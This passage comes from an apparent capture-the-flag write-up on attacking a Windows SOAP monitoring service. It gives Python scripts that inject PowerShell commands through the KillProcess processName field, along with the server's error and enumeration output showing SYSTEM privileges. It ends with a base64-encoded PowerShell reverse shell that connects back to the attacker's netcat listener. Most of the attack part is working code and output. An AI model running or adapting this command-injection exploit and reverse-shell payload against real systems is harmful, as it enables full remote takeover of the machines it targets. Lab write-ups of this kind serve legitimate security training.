   at System.Xml.XmlBufferReader.GetByteHard()&#xD;
   at System.Xml.XmlUTF8TextReader.ReadCharRef()&#xD;
   at System.Xml.XmlUTF8TextReader.ReadEscapedText()&#xD;
   at System.Xml.XmlUTF8TextReader.Read()&#xD;
   at System.Xml.XmlDictionaryReader.ReadContentAsString(Int32 maxStringContentLength)&#xD;
   at System.Xml.XmlBaseReader.ReadElementContentAsString()&#xD;
   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeParameters(XmlDictionaryReader reader, PartInfo[] parts, Object[] parameters)&#xD;
   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeRequest(XmlDictionaryReader reader, Object[] parameters)&#xD;
   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeRequest(Message message, Object[] parameters)</StackTrace><Type>System.Xml.XmlException</Type></InnerException><Message>The formatter threw an exception while trying to deserialize the message: Error in deserializing body of request message for operation 'KillProcess'. Unexpected end of file. Following elements are not closed: processName, KillProcess, Body, Envelope. Line 6, position 17.</Message><StackTrace>   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeRequest(Message message, Object[] parameters)&#xD;
   at System.ServiceModel.Dispatcher.DispatchOperationRuntime.DeserializeInputs(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.DispatchOperationRuntime.InvokeBegin(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage5(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage11(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.MessageRpc.Process(Boolean isOperationContextSet)</StackTrace><Type>System.ServiceModel.Dispatcher.NetDispatcherFaultException</Type></ExceptionDetail></detail></s:Fault></s:Body></s:Envelope>
[*] Trying: 'notepad | whoami'
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><s:Fault><faultcode xmlns:a="http://schemas.microsoft.com/net/2005/12/windowscommunicationfoundation/dispatcher">a:DeserializationFailed</faultcode><faultstring xml:lang="en-US">The formatter threw an exception while trying to deserialize the message: Error in deserializing body of request message for operation 'KillProcess'. Unexpected end of file. Following elements are not closed: processName, KillProcess, Body, Envelope. Line 6, position 17.</faultstring><detail><ExceptionDetail xmlns="http://schemas.datacontract.org/2004/07/System.ServiceModel" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><HelpLink i:nil="true"/><InnerException><HelpLink i:nil="true"/><InnerException i:nil="true"/><Message>Unexpected end of file. Following elements are not closed: processName, KillProcess, Body, Envelope. Line 6, position 17.</Message><StackTrace>   at System.Xml.XmlExceptionHelper.ThrowXmlException(XmlDictionaryReader reader, String res, String arg1, String arg2, String arg3)&#xD;
   at System.Xml.XmlExceptionHelper.ThrowUnexpectedEndOfFile(XmlDictionaryReader reader)&#xD;
   at System.Xml.XmlBufferReader.GetByteHard()&#xD;
   at System.Xml.XmlUTF8TextReader.ReadCharRef()&#xD;
   at System.Xml.XmlUTF8TextReader.ReadEscapedText()&#xD;
   at System.Xml.XmlUTF8TextReader.Read()&#xD;
   at System.Xml.XmlDictionaryReader.ReadContentAsString(Int32 maxStringContentLength)&#xD;
   at System.Xml.XmlBaseReader.ReadElementContentAsString()&#xD;
   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeParameters(XmlDictionaryReader reader, PartInfo[] parts, Object[] parameters)&#xD;
   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeRequest(XmlDictionaryReader reader, Object[] parameters)&#xD;
   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeRequest(Message message, Object[] parameters)</StackTrace><Type>System.Xml.XmlException</Type></InnerException><Message>The formatter threw an exception while trying to deserialize the message: Error in deserializing body of request message for operation 'KillProcess'. Unexpected end of file. Following elements are not closed: processName, KillProcess, Body, Envelope. Line 6, position 17.</Message><StackTrace>   at System.ServiceModel.Dispatcher.PrimitiveOperationFormatter.DeserializeRequest(Message message, Object[] parameters)&#xD;
   at System.ServiceModel.Dispatcher.DispatchOperationRuntime.DeserializeInputs(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.DispatchOperationRuntime.InvokeBegin(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage5(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.ImmutableDispatchRuntime.ProcessMessage11(MessageRpc&amp; rpc)&#xD;
   at System.ServiceModel.Dispatcher.MessageRpc.Process(Boolean isOperationContextSet)</StackTrace><Type>System.ServiceModel.Dispatcher.NetDispatcherFaultException</Type></ExceptionDetail></detail></s:Fault></s:Body></s:Envelope>
```

- Seems like the code breaks somewhere. Most likely thw `&` symbol. I replace it with XML `&amp` to see:
```
import requests

url = "http://240.0.0.1:8000/MonitorService"
headers = {"Content-Type": "text/xml"}

def soap_call(action, body_content, timeout=5):
    payload = f"""<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
  <soap:Body>
    {body_content}
  </soap:Body>
</soap:Envelope>"""
    try:
        r = requests.post(
            url,
            headers={**headers, "SOAPAction": f'"http://tempuri.org/IMonitoringService/{action}"'},
            data=payload,
            timeout=timeout
        )
        return r.text
    except requests.exceptions.Timeout:
        return "[TIMEOUT]"

out = "C:\\Users\\sqlmgmt\\Documents\\out2.txt"

print("[*] StartMonitoring:")
print(soap_call("StartMonitoring", "<tns:StartMonitoring/>"))

injections = [
    "notepad",
    "notepad &amp; whoami",
    "notepad &amp;&amp; whoami",
    "notepad | whoami",
]

for i in injections:
    print(f"[*] Trying: {i!r}")
    body = f"<tns:KillProcess><tns:processName>{i} 2&gt;&amp;1 | Out-File -Append -FilePath {out}</tns:processName></tns:KillProcess>"
    print(soap_call("KillProcess", body))
```

- The error I get clearly states `&` is not allowed here:
```
[*] StartMonitoring:
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><StartMonitoringResponse xmlns="http://tempuri.org/"><StartMonitoringResult>Monitoring started.</StartMonitoringResult></StartMonitoringResponse></s:Body></s:Envelope>
[*] Trying: 'notepad'
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcessResponse xmlns="http://tempuri.org/"><KillProcessResult>&#xD;
</KillProcessResult></KillProcessResponse></s:Body></s:Envelope>
[*] Trying: 'notepad &amp; whoami'
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcessResponse xmlns="http://tempuri.org/"><KillProcessResult>Error: At line:1 char:28&#xD;
+ Stop-Process -Name notepad &amp; whoami 2&gt;&amp;1 | Out-File -Append -FilePath ...&#xD;
+                            ~
The ampersand (&amp;) character is not allowed. The &amp; operator is reserved for future use; wrap an ampersand in double quotation marks ("&amp;") to pass it as part of a string.</KillProcessResult></KillProcessResponse></s:Body></s:Envelope>
[*] Trying: 'notepad &amp;&amp; whoami'
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcessResponse xmlns="http://tempuri.org/"><KillProcessResult>Error: At line:1 char:28&#xD;
+ Stop-Process -Name notepad &amp;&amp; whoami 2&gt;&amp;1 | Out-File -Append -FilePat ...&#xD;
+                            ~~
The token '&amp;&amp;' is not a valid statement separator in this version.</KillProcessResult></KillProcessResponse></s:Body></s:Envelope>
[*] Trying: 'notepad | whoami'
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><KillProcessResponse xmlns="http://tempuri.org/"><KillProcessResult>&#xD;
</KillProcessResult></KillProcessResponse></s:Body></s:Envelope>

```

- I then use escape instead and get a proper output in the output text file:
```
import requests
from xml.sax.saxutils import escape

url = "http://240.0.0.1:8000/MonitorService"
headers = {"Content-Type": "text/xml"}

def soap_call(action, body_content, timeout=10):
    payload = f"""<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
  <soap:Body>
    {body_content}
  </soap:Body>
</soap:Envelope>"""
    try:
        r = requests.post(
            url,
            headers={**headers, "SOAPAction": f'"http://tempuri.org/IMonitoringService/{action}"'},
            data=payload,
            timeout=timeout
        )
        return r.text
    except requests.exceptions.Timeout:
        return "[TIMEOUT]"

def kill(cmd):
    safe = escape(cmd)
    return soap_call("KillProcess", f"<tns:KillProcess><tns:processName>{safe}</tns:processName></tns:KillProcess>")

soap_call("StartMonitoring", "<tns:StartMonitoring/>")

out = "C:\\Users\\sqlmgmt\\Documents\\out3.txt"

print("[*] whoami:")
print(kill(f"x -Force -ErrorAction SilentlyContinue; whoami | Out-File -FilePath {out}"))

print("[*] hostname:")
print(kill(f"x -Force -ErrorAction SilentlyContinue; hostname | Out-File -Append -FilePath {out}"))

print("[*] whoami /priv:")
print(kill(f"x -Force -ErrorAction SilentlyContinue; whoami /priv | Out-File -Append -FilePath {out}"))

print("[*] directory listing:")
print(kill(f"x -Force -ErrorAction SilentlyContinue; Get-ChildItem C:\\Users | Out-File -Append -FilePath {out}"))
```

- I read the file on target:
```
type out3.txt

---OUTPUT---
nt authority\system
S200401

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/16/2025   4:06 PM                Administrator
d-r---         5/16/2025   4:06 PM                Public
d-----         5/16/2025   8:08 PM                sqlmgmt
```

- I finally I input my payload into this codeand grab a shell:
```
import requests
from xml.sax.saxutils import escape

url = "http://240.0.0.1:8000/MonitorService"
headers = {"Content-Type": "text/xml"}

def soap_call(action, body_content, timeout=10):
    payload = f"""<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/">
  <soap:Body>
    {body_content}
  </soap:Body>
</soap:Envelope>"""
    try:
        r = requests.post(
            url,
            headers={**headers, "SOAPAction": f'"http://tempuri.org/IMonitoringService/{action}"'},
            data=payload,
            timeout=timeout
        )
        return r.text
    except requests.exceptions.Timeout:
        return "[TIMEOUT]"

def kill(cmd):
    safe = escape(cmd)
    return soap_call("KillProcess", f"<tns:KillProcess><tns:processName>{safe}</tns:processName></tns:KillProcess>")

soap_call("StartMonitoring", "<tns:StartMonitoring/>")

out = "C:\\Users\\sqlmgmt\\Documents\\out.txt"

print("[*] whoami:")
print(kill(f"x -Force -ErrorAction SilentlyContinue; whoami | Out-File -FilePath {out}"))

print("[*] hostname:")
print(kill(f"x -Force -ErrorAction SilentlyContinue; hostname | Out-File -Append -FilePath {out}"))

print("[*] whoami /priv:")
print(kill(f"x -Force -ErrorAction SilentlyContinue; whoami /priv | Out-File -Append -FilePath {out}"))

print("[*] rce")
print(kill(f"x -Force -ErrorAction SilentlyContinue; powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4AMgAwADYAIgAsADkAOQA5ADkAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA | Out-File -Append -FilePath {out}"))

print("[*] directory listing:")
print(kill(f"x -Force -ErrorAction SilentlyContinue; Get-ChildItem C:\\Users | Out-File -Append -FilePath {out}"))
```

- I execute it and grab a reverse shell on my netcat listener:

![[Pasted image 20260402060347.png]]

- I grab the root flag:
![[Pasted image 20260402060405.png]]